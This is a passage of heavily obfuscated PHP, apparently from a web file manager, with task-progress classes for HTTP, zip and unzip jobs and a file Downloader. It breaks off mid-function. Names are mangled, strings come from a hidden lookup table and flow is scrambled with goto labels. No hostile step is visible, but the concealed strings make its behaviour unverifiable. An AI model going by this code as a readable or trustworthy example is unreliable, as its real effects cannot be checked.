$B£™ãÔ“[$aô¼Óº¤øí[976]] = $aô¼Óº¤øí[33]; $B£™ãÔ“[$aô¼Óº¤øí[1483]] = $aô¼Óº¤øí[33]; $B£™ãÔ“[$aô¼Óº¤øí[1484]] = 0; goto d¤ëŸ–¶ñ; FÁê¿‰¹æ: } public function copyFileEnd($CªÂµóà×í, $C¤Ù‚ÆÖ£, $E—›×àÂ„², $A‡´À±ÓÒ¾, $fˆíˆ¹æ¢ƒ, $BÕÎ‰¹†³Ó) { $DĞìì¢‹ã¾ =& $_SERVER[Å¸ş]; $Bù‹ á÷æ‚ =& $this->task; $Bù‹ á÷æ‚[$DĞìì¢‹ã¾[1482]] = $Bù‹ á÷æ‚[$DĞìì¢‹ã¾[1481]]; $Bù‹ á÷æ‚[$DĞìì¢‹ã¾[1483]] = $DĞìì¢‹ã¾[33]; if ($fˆíˆ¹æ¢ƒ == $Bù‹ á÷æ‚[$DĞìì¢‹ã¾[1479]]) { $Bù‹ á÷æ‚[$DĞìì¢‹ã¾[1485]] += $Bù‹ á÷æ‚[$DĞìì¢‹ã¾[1481]]; $Bù‹ á÷æ‚[$DĞìì¢‹ã¾[1486]] = $Bù‹ á÷æ‚[$DĞìì¢‹ã¾[1485]]; $this->update(1); } else { $this->update(); $Bù‹ á÷æ‚[$DĞìì¢‹ã¾[1482]] = 0; } self::log($DĞìì¢‹ã¾[1494] . $C¤Ù‚ÆÖ£ . $DĞìì¢‹ã¾[66] . $A‡´À±ÓÒ¾ . $DĞìì¢‹ã¾[217] . $fˆíˆ¹æ¢ƒ . $DĞìì¢‹ã¾[1495] . $Bù‹ á÷æ‚[$DĞìì¢‹ã¾[1479]]); } public function updateFileEnd($eÚø¿œßÏ¬, $Eã‡¡ÆÜ›) { goto DÜ”’˜¡Í; e‘Äòñ°™: $this->update(1); self::log($Aä¡’›‡åº[1496] . $eÚø¿œßÏ¬); goto A‘ñ‰Â•§Á; eŞ÷‡¾‡£–: $AØŞù®”„ì[$Aä¡’›‡åº[1481]] = $Eã‡¡ÆÜ›; $AØŞù®”„ì[$Aä¡’›‡åº[1485]] += $Eã‡¡ÆÜ›; $AØŞù®”„ì[$Aä¡’›‡åº[1486]] = $AØŞù®”„ì[$Aä¡’›‡åº[1485]]; goto e‘Äòñ°™; DÜ”’˜¡Í: $Aä¡’›‡åº =& $_SERVER[Å¸ş]; $AØŞù®”„ì =& $this->task; $AØŞù®”„ì[$Aä¡’›‡åº[1479]] = $eÚø¿œßÏ¬; goto eŞ÷‡¾‡£–; A‘ñ‰Â•§Á: } public function sourceModelCopy($a¼µÓ¬ ) { goto DŞÓ±•ğ’‘; D™èîÚ§Í´: $a†±‹Ñß•ù =& $this->task; $this->sourceModelCopyFlag = !0; $bøÉ¿Ûã¶› = 0; goto FíåáæÁØ; FíåáæÁØ: switch ($Cä”©£Õ¢™) { case $Fé°ß×’›‰[509]: $bøÉ¿Ûã¶› = 1; break; case $Fé°ß×’›‰[512]: $a†±‹Ñß•ù[$Fé°ß×’›‰[1479]] = $Aç¤Âãó[$Fé°ß×’›‰[28]]; break; case $Fé°ß×’›‰[514]: $bøÉ¿Ûã¶› = intval($a¼µÓ¬ [$Fé°ß×’›‰[363]] * 0.4); break; case $Fé°ß×’›‰[516]: $bøÉ¿Ûã¶› = intval($a¼µÓ¬ [$Fé°ß×’›‰[363]] * 0.2); break; case $Fé°ß×’›‰[518]: $bøÉ¿Ûã¶› = intval($a¼µÓ¬ [$Fé°ß×’›‰[363]] * 0.4); break; } $this->update($bøÉ¿Ûã¶›); $this->sourceModelCopyFlag = !1; goto bŸêÀ¤‚âÜ; DŞÓ±•ğ’‘: $Fé°ß×’›‰ =& $_SERVER[Å¸ş]; $Cä”©£Õ¢™ = $a¼µÓ¬ [0]; $Aç¤Âãó = $a¼µÓ¬ [1]; goto D™èîÚ§Í´; bŸêÀ¤‚âÜ: } public function sourceRemove($B­Ü¼íÕ¿, $e«•ˆå‚È¹) { $fÁø…®‹á =& $_SERVER[Å¸ş]; $this->sourceModelCopyFlag = !0; $BœŒíÉ“ = 1; if (isset($B­Ü¼íÕ¿[$fÁø…®‹á[80]])) { $BœŒíÉ“ = $B­Ü¼íÕ¿[$fÁø…®‹á[80]][$fÁø…®‹á[78]] + $B­Ü¼íÕ¿[$fÁø…®‹á[80]][$fÁø…®‹á[79]] + 1; } $this->update($BœŒíÉ“); $this->sourceModelCopyFlag = !1; } public function sourceMove($E‘»ÌÑö’‡) { $this->sourceRemove($E‘»ÌÑö’‡, !1); } public function curlProgress($dœê‚Û˜ïŞ, $CĞ±Î•“³Ì, $B­«œ¸ËÓ°, $BŞÑùÂˆ°, $e™¤ğç¯è) { $AÂ‰‘ÀÂƒ‰ =& $_SERVER[Å¸ş]; $CÄÆ±·¬Ö =& $this->task; if ($e™¤ğç¯è > 0) { $CÄÆ±·¬Ö[$AÂ‰‘ÀÂƒ‰[976]] = $AÂ‰‘ÀÂƒ‰[1497]; $CÄÆ±·¬Ö[$AÂ‰‘ÀÂƒ‰[1483]] = $AÂ‰‘ÀÂƒ‰[103]; if ($CÄÆ±·¬Ö[$AÂ‰‘ÀÂƒ‰[1481]] == $BŞÑùÂˆ° || $BŞÑùÂˆ° > 1024 * 1024) { $CÄÆ±·¬Ö[$AÂ‰‘ÀÂƒ‰[1482]] = $e™¤ğç¯è; } if ($CÄÆ±·¬Ö[$AÂ‰‘ÀÂƒ‰[1484]]) { $CÄÆ±·¬Ö[$AÂ‰‘ÀÂƒ‰[1482]] = $e™¤ğç¯è + $CÄÆ±·¬Ö[$AÂ‰‘ÀÂƒ‰[1484]]; } } else { if ($B­«œ¸ËÓ° > 0) { if ($CÄÆ±·¬Ö[$AÂ‰‘ÀÂƒ‰[1481]] == $CĞ±Î•“³Ì) { $CÄÆ±·¬Ö[$AÂ‰‘ÀÂƒ‰[1482]] = $B­«œ¸ËÓ°; $CÄÆ±·¬Ö[$AÂ‰‘ÀÂƒ‰[976]] = $AÂ‰‘ÀÂƒ‰[1498]; $CÄÆ±·¬Ö[$AÂ‰‘ÀÂƒ‰[1483]] = $AÂ‰‘ÀÂƒ‰[1038]; } } } $this->update(); } public function curlProgressStart($FÊÀƒÇĞ …) { } public function curlProgressEnd($a¿¯Šš“’ø) { $FÁÓ¾‡‹ÈŞ =& $_SERVER[Å¸ş]; $d¼›‡ò¡¬¤ =& $this->task; $aõ¥«‹‚ÛÕ = curl_getinfo($a¿¯Šš“’ø); $a½ƒœ£Çµ« = $aõ¥«‹‚ÛÕ[$FÁÓ¾‡‹ÈŞ[1499]]; if ($d¼›‡ò¡¬¤[$FÁÓ¾‡‹ÈŞ[1483]] == $FÁÓ¾‡‹ÈŞ[103] && $a½ƒœ£Çµ«) { $d¼›‡ò¡¬¤[$FÁÓ¾‡‹ÈŞ[1484]] += $a½ƒœ£Çµ«; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $d‚¹Ğ£öä =& $_SERVER[Å¸ş]; $F¡‚Æì¶‘ =& $this->task; $F¡‚Æì¶‘[$d‚¹Ğ£öä[1500]] = 1; Hook::bind($d‚¹Ğ£öä[1473], array($this, $d‚¹Ğ£öä[1501])); Hook::bind($d‚¹Ğ£öä[1475], array($this, $d‚¹Ğ£öä[1502])); Hook::bind($d‚¹Ğ£öä[1477], array($this, $d‚¹Ğ£öä[1503])); } protected function endAfter() { $b…”Ûç =& $_SERVER[Å¸ş]; Hook::unbind($b…”Ûç[1473], array($this, $b…”Ûç[1501])); Hook::unbind($b…”Ûç[1475], array($this, $b…”Ûç[1502])); Hook::unbind($b…”Ûç[1477], array($this, $b…”Ûç[1503])); } public function progressStart($FŒ×ôÃá‚) { $DîƒŠ•æ°„ =& $_SERVER[Å¸ş]; $fŸ‚Óïõ¢Í = curl_getinfo($FŒ×ôÃá‚); self::log($DîƒŠ•æ°„[1504] . $fŸ‚Óïõ¢Í[$DîƒŠ•æ°„[295]]); self::valueSet($this->task[$DîƒŠ•æ°„[367]], $this->task); } public function progressEnd($BÇÇíê·å) { $FÕµİ²Ê†† =& $_SERVER[Å¸ş]; self::log($FÕµİ²Ê††[1505] . $this->task[$FÕµİ²Ê††[367]]); $this->end(); } public function progress($EŠ£¡––ç¦, $bŞÏ¿Ø‚§, $A™¿Óæ¬†, $c×ª¿«ïí´, $FÑ’ŒŒší) { $fîÉë¸° =& $_SERVER[Å¸ş]; $e§•êÇæ‚Ê =& $this->task; if ($FÑ’ŒŒší > 0) { $e§•êÇæ‚Ê[$fîÉë¸°[974]] = $e§•êÇæ‚Ê[$fîÉë¸°[974]] == 0 ? $c×ª¿«ïí´ : $e§•êÇæ‚Ê[$fîÉë¸°[974]]; $e§•êÇæ‚Ê[$fîÉë¸°[988]] = $FÑ’ŒŒší; } else { if ($A™¿Óæ¬† > 0) { $e§•êÇæ‚Ê[$fîÉë¸°[974]] = $e§•êÇæ‚Ê[$fîÉë¸°[974]] == 0 ? $bŞÏ¿Ø‚§ : $e§•êÇæ‚Ê[$fîÉë¸°[974]]; $e§•êÇæ‚Ê[$fîÉë¸°[988]] = $A™¿Óæ¬†; } } $this->update(); self::log("\160\x72\157\147\x72\x65\163\163\110\164\x74\x70\x3a\x64\157\167\x6e\72{$A™¿Óæ¬†}\x2f{$bŞÏ¿Ø‚§}\x3b\40\165\160\x6c\x6f\141\144\72{$FÑ’ŒŒší}\x2f{$c×ª¿«ïí´}\x3b"); } } goto A”÷Øª„ä¡; A”÷Øª„ä¡: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto eôî÷ÑÅ‹„; bò´óÜ©„ˆ: if (!$CŠŠÊÁ’†[$D¾à²ÜÊ»[1340]]) { $CŠŠÊÁ’†[$D¾à²ÜÊ»[1340]] = LNG($D¾à²ÜÊ»[1510]); } goto d±–Ã—; EÖö‰­àï‚: Hook::bind($D¾à²ÜÊ»[1033], array($this, $D¾à²ÜÊ»[1508])); $CŠŠÊÁ’† =& $this->task; $CŠŠÊÁ’†[$D¾à²ÜÊ»[1509]] = $D¾à²ÜÊ»[1038]; goto bò´óÜ©„ˆ; eôî÷ÑÅ‹„: $D¾à²ÜÊ» =& $_SERVER[Å¸ş]; parent::startAfter(); Hook::bind($D¾à²ÜÊ»[1506], array($this, $D¾à²ÜÊ»[1507])); goto EÖö‰­àï‚; d±–Ã—: } protected function endAfter() { $Aäšè³¹‚‘ =& $_SERVER[Å¸ş]; parent::endAfter(); Hook::unbind($Aäšè³¹‚‘[1506], array($this, $Aäšè³¹‚‘[1507])); Hook::unbind($Aäšè³¹‚‘[1033], array($this, $Aäšè³¹‚‘[1508])); } public function updateAfter() { $cÙ‚Œêë‚Â =& $_SERVER[Å¸ş]; $CïçìÙ©â =& $this->task; if (!$CïçìÙ©â[$cÙ‚Œêë‚Â[974]] || !$CïçìÙ©â[$cÙ‚Œêë‚Â[701]]) { return; } if ($CïçìÙ©â[$cÙ‚Œêë‚Â[1509]] == $cÙ‚Œêë‚Â[1038]) { $d¦‰¿‰ÏæŠ = 0; if ($CïçìÙ©â[$cÙ‚Œêë‚Â[1481]]) { $d¦‰¿‰ÏæŠ = $CïçìÙ©â[$cÙ‚Œêë‚Â[1482]] / $CïçìÙ©â[$cÙ‚Œêë‚Â[1481]]; } $CïçìÙ©â[$cÙ‚Œêë‚Â[1437]] = $d¦‰¿‰ÏæŠ * 0.3; } else { if ($CïçìÙ©â[$cÙ‚Œêë‚Â[1509]] == $cÙ‚Œêë‚Â[301]) { $d¦‰¿‰ÏæŠ = $CïçìÙ©â[$cÙ‚Œêë‚Â[988]] / $CïçìÙ©â[$cÙ‚Œêë‚Â[974]]; $CïçìÙ©â[$cÙ‚Œêë‚Â[1437]] = 0.3 + $d¦‰¿‰ÏæŠ * 0.4; } else { if ($CïçìÙ©â[$cÙ‚Œêë‚Â[1509]] == $cÙ‚Œêë‚Â[103]) { $Cî™ğ¯ëƒÈ = 0; if ($CïçìÙ©â[$cÙ‚Œêë‚Â[1483]] == $cÙ‚Œêë‚Â[103]) { $Cî™ğ¯ëƒÈ = $CïçìÙ©â[$cÙ‚Œêë‚Â[1482]]; } $d¦‰¿‰ÏæŠ = ($CïçìÙ©â[$cÙ‚Œêë‚Â[1486]] + $Cî™ğ¯ëƒÈ) / $CïçìÙ©â[$cÙ‚Œêë‚Â[701]]; $CïçìÙ©â[$cÙ‚Œêë‚Â[1437]] = 0.3 + 0.4 + $d¦‰¿‰ÏæŠ * 0.3; } } } if ($CïçìÙ©â[$cÙ‚Œêë‚Â[1437]] > 0) { $BÆÀ××¬›¿ = timeFloat() - $CïçìÙ©â[$cÙ‚Œêë‚Â[1439]] - $CïçìÙ©â[$cÙ‚Œêë‚Â[1442]]; $CïçìÙ©â[$cÙ‚Œêë‚Â[1443]] = $BÆÀ××¬›¿ * (1 - $CïçìÙ©â[$cÙ‚Œêë‚Â[1437]]) / $CïçìÙ©â[$cÙ‚Œêë‚Â[1437]]; } } public function addFile($CÜÚ¯—à) { goto D²å»¹ñò¾; a°ÇÒ œ: $fç„ÖÛì•á[$CáĞ¤àëš[974]] = 1; $cÒ¡›ÂÒÈÉ = 0; $fç„ÖÛì•á[$CáĞ¤àëš[1490]] = array($CáĞ¤àëš[1491] => $cÒ¡›ÂÒÈÉ + 1, $CáĞ¤àëš[386] => $D…ºŒ¯¸Š[$CáĞ¤àëš[28]], $CáĞ¤àëš[75] => $D…ºŒ¯¸Š[$CáĞ¤àëš[75]], $CáĞ¤àëš[468] => $D…ºŒ¯¸Š[$CáĞ¤àëš[468]] ? $D…ºŒ¯¸Š[$CáĞ¤àëš[468]] : $D…ºŒ¯¸Š[$CáĞ¤àëš[75]]); goto bÊŒ”¥àÁ; Cì¡ôµĞ„„: $fç„ÖÛì•á[$CáĞ¤àëš[976]] = $CáĞ¤àëš[1498]; $fç„ÖÛì•á[$CáĞ¤àëš[1483]] = $CáĞ¤àëš[1038]; $fç„ÖÛì•á[$CáĞ¤àëš[701]] = $D…ºŒ¯¸Š[$CáĞ¤àëš[77]]; goto a°ÇÒ œ; e ¬ÆÉ‡é³: $fç„ÖÛì•á[$CáĞ¤àëš[1479]] = $D…ºŒ¯¸Š[$CáĞ¤àëš[28]]; $fç„ÖÛì•á[$CáĞ¤àëš[1481]] = $D…ºŒ¯¸Š[$CáĞ¤àëš[77]]; $fç„ÖÛì•á[$CáĞ¤àëš[1482]] = 0; goto Cì¡ôµĞ„„; bÊŒ”¥àÁ: $this->update(); goto CãÉØ˜ˆ²˜; D²å»¹ñò¾: $CáĞ¤àëš =& $_SERVER[Å¸ş]; $fç„ÖÛì•á =& $this->task; $D…ºŒ¯¸Š = IO::info($CÜÚ¯—à); goto e ¬ÆÉ‡é³; CãÉØ˜ˆ²˜: } public function unzipAfter($B«â¡îÒ©) { goto F¾œ¶Ë‡İ›; BØçó‚Ï‘: if ($FÇ¨ä¶†‰Ï[$cØ³˜‡³‰Ã[29]] == $cØ³˜‡³‰Ã[167]) { $b£§ï«ß¸ƒ[$cØ³˜‡³‰Ã[974]] = 1; } else { $b£§ï«ß¸ƒ[$cØ³˜‡³‰Ã[974]] = $FÇ¨ä¶†‰Ï[$cØ³˜‡³‰Ã[80]][$cØ³˜‡³‰Ã[78]]; } $b£§ï«ß¸ƒ[$cØ³˜‡³‰Ã[976]] = $cØ³˜‡³‰Ã[33]; $b£§ï«ß¸ƒ[$cØ³˜‡³‰Ã[1483]] = 0; goto c†”ÆŠÄ†Å; dµòï¬ÖÒ¸: $this->update(); self::log($cØ³˜‡³‰Ã[1511] . json_encode(array($b£§ï«ß¸ƒ, $FÇ¨ä¶†‰Ï))); goto aõ˜Ï™Ø·Ï; Cİë›ùù½Ô: $FÇ¨ä¶†‰Ï = IO::infoWithChildren($B«â¡îÒ©); $dÀŸ‰×ÚÚÓ = 0; $b£§ï«ß¸ƒ[$cØ³˜‡³‰Ã[1490]] = array($cØ³˜‡³‰Ã[1491] => $dÀŸ‰×ÚÚÓ + 1, $cØ³˜‡³‰Ã[386] => $FÇ¨ä¶†‰Ï[$cØ³˜‡³‰Ã[28]], $cØ³˜‡³‰Ã[75] => $FÇ¨ä¶†‰Ï[$cØ³˜‡³‰Ã[75]], $cØ³˜‡³‰Ã[468] => $FÇ¨ä¶†‰Ï[$cØ³˜‡³‰Ã[468]] ? $FÇ¨ä¶†‰Ï[$cØ³˜‡³‰Ã[468]] : $FÇ¨ä¶†‰Ï[$cØ³˜‡³‰Ã[75]]); goto BØçó‚Ï‘; c†”ÆŠÄ†Å: $b£§ï«ß¸ƒ[$cØ³˜‡³‰Ã[988]] = 0; $b£§ï«ß¸ƒ[$cØ³˜‡³‰Ã[1481]] = 0; $b£§ï«ß¸ƒ[$cØ³˜‡³‰Ã[1482]] = 0; goto c„µ¢õ°§‚; F¾œ¶Ë‡İ›: $cØ³˜‡³‰Ã =& $_SERVER[Å¸ş]; $b£§ï«ß¸ƒ =& $this->task; $b£§ï«ß¸ƒ[$cØ³˜‡³‰Ã[1509]] = $cØ³˜‡³‰Ã[103]; goto Cİë›ùù½Ô; c„µ¢õ°§‚: $b£§ï«ß¸ƒ[$cØ³˜‡³‰Ã[1479]] = $cØ³˜‡³‰Ã[33]; $b£§ï«ß¸ƒ[$cØ³˜‡³‰Ã[1486]] = 0; $b£§ï«ß¸ƒ[$cØ³˜‡³‰Ã[701]] = $FÇ¨ä¶†‰Ï[$cØ³˜‡³‰Ã[77]]; goto dµòï¬ÖÒ¸; aõ˜Ï™Ø·Ï: } public function nameParse($C‰±Öª²›è) { goto EÆ†Ç¸“ÅÜ; eã‰ßáŸ¢ã: $this->update(); goto AÈâ‘Š‘ƒÕ; EÆ†Ç¸“ÅÜ: $F“Ñ›ƒºÏ” =& $_SERVER[Å¸ş]; $cë‚Ğ„ˆÂí =& $this->task; if ($cë‚Ğ„ˆÂí[$F“Ñ›ƒºÏ”[1509]] == $F“Ñ›ƒºÏ”[1038]) { $cë‚Ğ„ˆÂí[$F“Ñ›ƒºÏ”[1509]] = $F“Ñ›ƒºÏ”[301]; $cë‚Ğ„ˆÂí[$F“Ñ›ƒºÏ”[1486]] = 0; $cë‚Ğ„ˆÂí[$F“Ñ›ƒºÏ”[701]] = 0; } goto A¼Ô©£àÕ‚; A¼Ô©£àÕ‚: $c†±¿Ğ•çÑ = get_path_this($C‰±Öª²›è); if (strstr($c†±¿Ğ•çÑ, $F“Ñ›ƒºÏ”[91])) { $cë‚Ğ„ˆÂí[$F“Ñ›ƒºÏ”[988]] += 1; $cë‚Ğ„ˆÂí[$F“Ñ›ƒºÏ”[974]] += 1; } $cë‚Ğ„ˆÂí[$F“Ñ›ƒºÏ”[1479]] = $C‰±Öª²›è; goto eã‰ßáŸ¢ã; AÈâ‘Š‘ƒÕ: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $a”Îõ±¿«— =& $_SERVER[Å¸ş]; parent::startAfter(); Hook::bind($a”Îõ±¿«—[1512], array($this, $a”Îõ±¿«—[1507])); $bäñÆàĞ±Ö =& $this->task; $bäñÆàĞ±Ö[$a”Îõ±¿«—[1509]] = $a”Îõ±¿«—[1038]; if (!$bäñÆàĞ±Ö[$a”Îõ±¿«—[1340]]) { $bäñÆàĞ±Ö[$a”Îõ±¿«—[1340]] = LNG($a”Îõ±¿«—[1513]); } } protected function endAfter() { $eÙ˜•µÊ§· =& $_SERVER[Å¸ş]; parent::endAfter(); Hook::unbind($eÙ˜•µÊ§·[1512], array($this, $eÙ˜•µÊ§·[1507])); } public function updateAfter() { $A‚ïĞù‚‰Ì =& $_SERVER[Å¸ş]; $fÇ‚ÑİÌ†‚ =& $this->task; if (!$fÇ‚ÑİÌ†‚[$A‚ïĞù‚‰Ì[974]] || !$fÇ‚ÑİÌ†‚[$A‚ïĞù‚‰Ì[701]]) { return; } if ($fÇ‚ÑİÌ†‚[$A‚ïĞù‚‰Ì[1509]] == $A‚ïĞù‚‰Ì[1038]) { $fÁ•‡šêİß = $fÇ‚ÑİÌ†‚[$A‚ïĞù‚‰Ì[1482]]; if ($fÇ‚ÑİÌ†‚[$A‚ïĞù‚‰Ì[1483]] != $A‚ïĞù‚‰Ì[1038]) { $fÁ•‡šêİß = 0; } $EóÊÙ›©© = ($fÇ‚ÑİÌ†‚[$A‚ïĞù‚‰Ì[1486]] + $fÁ•‡šêİß) / $fÇ‚ÑİÌ†‚[$A‚ïĞù‚‰Ì[701]]; $fÇ‚ÑİÌ†‚[$A‚ïĞù‚‰Ì[1437]] = $EóÊÙ›©© * 0.3; } else { if ($fÇ‚ÑİÌ†‚[$A‚ïĞù‚‰Ì[1509]] == $A‚ïĞù‚‰Ì[301]) { $EóÊÙ›©© = $fÇ‚ÑİÌ†‚[$A‚ïĞù‚‰Ì[988]] / $fÇ‚ÑİÌ†‚[$A‚ïĞù‚‰Ì[974]]; $fÇ‚ÑİÌ†‚[$A‚ïĞù‚‰Ì[1437]] = 0.3 + $EóÊÙ›©© * 0.5; } else { if ($fÇ‚ÑİÌ†‚[$A‚ïĞù‚‰Ì[1509]] == $A‚ïĞù‚‰Ì[103]) { $EóÊÙ›©© = 0; if ($fÇ‚ÑİÌ†‚[$A‚ïĞù‚‰Ì[1481]]) { $EóÊÙ›©© = $fÇ‚ÑİÌ†‚[$A‚ïĞù‚‰Ì[1482]] / $fÇ‚ÑİÌ†‚[$A‚ïĞù‚‰Ì[1481]]; } $fÇ‚ÑİÌ†‚[$A‚ïĞù‚‰Ì[1437]] = 0.3 + 0.5 + $EóÊÙ›©© * 0.2; } } } if ($fÇ‚ÑİÌ†‚[$A‚ïĞù‚‰Ì[1437]] > 0) { $eËƒ«»Åòä = timeFloat() - $fÇ‚ÑİÌ†‚[$A‚ïĞù‚‰Ì[1439]] - $fÇ‚ÑİÌ†‚[$A‚ïĞù‚‰Ì[1442]]; $fÇ‚ÑİÌ†‚[$A‚ïĞù‚‰Ì[1443]] = $eËƒ«»Åòä * (1 - $fÇ‚ÑİÌ†‚[$A‚ïĞù‚‰Ì[1437]]) / $fÇ‚ÑİÌ†‚[$A‚ïĞù‚‰Ì[1437]]; } } public function copyFileStart($cÍÓ‰¶Ã½ó, $EÛ˜Îõ±òˆ, $dİ¤Ëƒ÷ŒÑ, $CÌéÇ±¨, $B„ÌÔîøÅ, $CŸ†ã…†) { $EÈ‡İ÷åÈ =& $_SERVER[Å¸ş]; parent::copyFileStart($cÍÓ‰¶Ã½ó, $EÛ˜Îõ±òˆ, $dİ¤Ëƒ÷ŒÑ, $CÌéÇ±¨, $B„ÌÔîøÅ, $CŸ†ã…†); $bÎ´æ‰……ê =& $this->task; if ($bÎ´æ‰……ê[$EÈ‡İ÷åÈ[1509]] == $EÈ‡İ÷åÈ[301]) { $bÎ´æ‰……ê[$EÈ‡İ÷åÈ[1509]] = $EÈ‡İ÷åÈ[103]; } $this->update(); } public function copyFileEnd($E½Ï‡íÃö‹, $A˜ñõõŠÁË, $e‡’„ÇÚ´Õ, $eºŠÒéé, $EŒê½˜‰ƒ§, $b»ÎÊä¤ïˆ) { $b”½ºÁÒ˜÷ =& $_SERVER[Å¸ş]; $Dù£ŠÃ³İ =& $this->task; $Dù£ŠÃ³İ[$b”½ºÁÒ˜÷[1482]] = $Dù£ŠÃ³İ[$b”½ºÁÒ˜÷[1481]]; $Dù£ŠÃ³İ[$b”½ºÁÒ˜÷[1486]] += $Dù£ŠÃ³İ[$b”½ºÁÒ˜÷[1481]]; $Dù£ŠÃ³İ[$b”½ºÁÒ˜÷[1483]] = $b”½ºÁÒ˜÷[33]; $this->update(); } public function nameParse($E…‡›¸¥ö‹) { $c©¶æ´‰‹ =& $_SERVER[Å¸ş]; $cöÓí×¿± =& $this->task; if ($cöÓí×¿±[$c©¶æ´‰‹[988]] < $cöÓí×¿±[$c©¶æ´‰‹[974]]) { $B÷ò²ïØš = get_path_this($E…‡›¸¥ö‹); if (strstr($B÷ò²ïØš, $c©¶æ´‰‹[91])) { $cöÓí×¿±[$c©¶æ´‰‹[988]] += 1; } } if ($cöÓí×¿±[$c©¶æ´‰‹[1509]] == $c©¶æ´‰‹[1038]) { $cöÓí×¿±[$c©¶æ´‰‹[1509]] = $c©¶æ´‰‹[301]; } $cöÓí×¿±[$c©¶æ´‰‹[1479]] = $E…‡›¸¥ö‹; $this->update(); } } class Downloader { static function start($f–Áæ‘Èª‘, $Còƒ ¢ÔÎ, $e¬¤²Ã®ç = 10) { goto aö¡œ‡½°ä; FÓÉãæì: $aß·µ½À¸ = intval($DÑ£Ò«Õ‚‰[$a±ä¡»¸§è[325]]); if (file_exists($bù•…ÚÖ«) && time() - filemtime($bù•…ÚÖ«) < 3) { return array($a±ä¡»¸§è[1030] => !1, $a±ä¡»¸§è[1032] => $a±ä¡»¸§è[1516]); } $BêœŠâÎÖ = array(); goto f„Á¯œÇ°Ò; f„Á¯œÇ°Ò: if (is_file($aÀé¸±»–Ü)) { $F—«ÂÉ™Äì = file_get_contents($aÀé¸±»–Ü); $BêœŠâÎÖ = json_decode($F—«ÂÉ™Äì, 1); } if (file_exists($Còƒ ¢ÔÎ) && $aß·µ½À¸ == filesize($Còƒ ¢ÔÎ)) { @unlink($bù•…ÚÖ«); @unlink($aÀé¸±»–Ü); return array($a±ä¡»¸§è[1030] => !0, $a±ä¡»¸§è[1032] => $a±ä¡»¸§è[1517]); } if ($BêœŠâÎÖ[$a±ä¡»¸§è[325]] != $aß·µ½À¸) { $BêœŠâÎÖ = array($a±ä¡»¸§è[325] => $aß·µ½À¸); } goto dĞÏÑİÛ”; dĞÏÑİÛ”: if ($fÄÊƒ«™« > $aß·µ½À¸) { @unlink($bù•…ÚÖ«); } file_put_contents($aÀé¸±»–Ü, json_encode($BêœŠâÎÖ)); $fÀÆ¿¼…„Ñ = self::fileDownloadCurl($f–Áæ‘Èª‘, $Còƒ ¢ÔÎ, !0, $fÄÊƒ«™«, $aß·µ½À¸); goto D­†´îâ”ƒ; D­†´îâ”ƒ: if ($fÀÆ¿¼…„Ñ[$a±ä¡»¸§è[1030]]) { @unlink($aÀé¸±»–Ü); } return $fÀÆ¿¼…„Ñ; goto DÂ¬°ß²; C¡¨±‘ê´¦: if (!$f–Áæ‘Èª‘) { return array($a±ä¡»¸§è[1030] => !1, $a±ä¡»¸§è[1032] => $a±ä¡»¸§è[1035]); } if (!$DÑ£Ò«Õ‚‰[$a±ä¡»¸§è[1286]] || $DÑ£Ò«Õ‚‰[$a±ä¡»¸§è[325]] == 0) { @unlink($bù•…ÚÖ«); @unlink($Còƒ ¢ÔÎ); $fÀÆ¿¼…„Ñ = self::fileDownloadFopen($f–Áæ‘Èª‘, $Còƒ ¢ÔÎ, $DÑ£Ò«Õ‚‰[$a±ä¡»¸§è[325]]); if ($fÀÆ¿¼…„Ñ[$a±ä¡»¸§è[1030]]) { return $fÀÆ¿¼…„Ñ; } else { @unlink($bù•…ÚÖ«); @unlink($Còƒ ¢ÔÎ); $fÀÆ¿¼…„Ñ = self::fileDownloadCurl($f–Áæ‘Èª‘, $Còƒ ¢ÔÎ, !1, 0, $DÑ£Ò«Õ‚‰[$a±ä¡»¸§è[325]]); @unlink($bù•…ÚÖ«); return $fÀÆ¿¼…„Ñ; } } $fÄÊƒ«™« = is_file($bù•…ÚÖ«) ? filesize($bù•…ÚÖ«) : 0; goto FÓÉãæì; aö¡œ‡½°ä: $a±ä¡»¸§è =& $_SERVER[Å¸ş]; if (!request_url_safe($f–Áæ‘Èª‘)) { return array($a±ä¡»¸§è[1030] => !1, $a±ä¡»¸§è[1032] => $a±ä¡»¸§è[1035]); } $aÀé¸±»–Ü = $Còƒ ¢ÔÎ . $a±ä¡»¸§è[1514]; goto E®æ²Ê«ë·; E®æ²Ê«ë·: $bù•…ÚÖ« = $Còƒ ¢ÔÎ . $a±ä¡»¸§è[1515]; if (is_array($f–Áæ‘Èª‘)) { $DÑ£Ò«Õ‚‰ = $f–Áæ‘Èª‘; } else { $DÑ£Ò«Õ‚‰ = url_header($f–Áæ‘Èª‘); } $f–Áæ‘Èª‘ = $DÑ£Ò«Õ‚‰[$a±ä¡»¸§è[295]]; goto C¡¨±‘ê´¦; DÂ¬°ß²: } static function fileDownloadFopen($e‹ÛÉµ¤, $d¸¼‚ø¿Ï¤, $C±Š‹ £ô¬ = 0) { $B¦­öÕ‘  =& $_SERVER[Å¸ş]; @ini_set($B¦­öÕ‘ [1518], $B¦­öÕ‘ [1519]); $c¨Ì»¡®¯ = $d¸¼‚ø¿Ï¤ . $B¦­öÕ‘ [1515]; set_timeout(); @unlink($c¨Ì»¡®¯); if ($AÈÔŞÀ˜ = @fopen($e‹ÛÉµ¤, $B¦­öÕ‘ [1520])) { goto bÏÛÙìÑƒ; eÌœÈ§¼ñ™: fclose($AÈÔŞÀ˜); self::checkGzip($c¨Ì»¡®¯); if (!@rename($c¨Ì»¡®¯, $d¸¼‚ø¿Ï¤)) { usleep(round(rand(0, 1000) * 50)); @unlink($d¸¼‚ø¿Ï¤); $Fóñ¥óªÖÁ = @rename($c¨Ì»¡®¯, $d¸¼‚ø¿Ï¤); if (!$Fóñ¥óªÖÁ) { return array($B¦­öÕ‘ [1030] => !1, $B¦­öÕ‘ [1032] => $B¦­öÕ‘ [1524]); } } goto bÄ–˜†™»Â; bÄ–˜†™»Â: return array($B¦­öÕ‘ [1030] => !0, $B¦­öÕ‘ [1032] => $B¦­öÕ‘ [699]); goto b›íÑË‹…Ë; bÏÛÙìÑƒ: if (!($dõ¥¾ æ›Õ = @fopen($c¨Ì»¡®¯, $B¦­öÕ‘ [1521]))) { return array($B¦­öÕ‘ [1030] => !1, $B¦­öÕ‘ [1032] => $B¦­öÕ‘ [1522]); } while (!feof($AÈÔŞÀ˜)) { if (!file_exists($c¨Ì»¡®¯)) { fclose($dõ¥¾ 